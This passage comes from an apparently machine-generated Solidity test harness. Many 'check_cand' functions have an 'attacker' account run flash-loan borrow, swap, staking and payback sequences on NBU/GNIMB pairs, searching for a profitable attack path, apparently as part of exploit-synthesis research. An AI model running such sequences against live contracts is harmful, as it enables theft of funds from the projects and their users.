        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4203(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4204(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4205(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4206(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4207(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4208(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4209(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4210(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4211(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4212(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4213(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4214(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4215(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4216(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4217(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4218(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4219(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4220(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4221(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4222(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4223(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4224(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4225(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4226(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4227(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4228(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4229(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4230(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4231(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4232(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4233(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4234(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4235(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4236(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4237(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4238(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4239(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4240(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4241(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4242(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4243(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4244(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4245(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4246(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4247(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4248(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
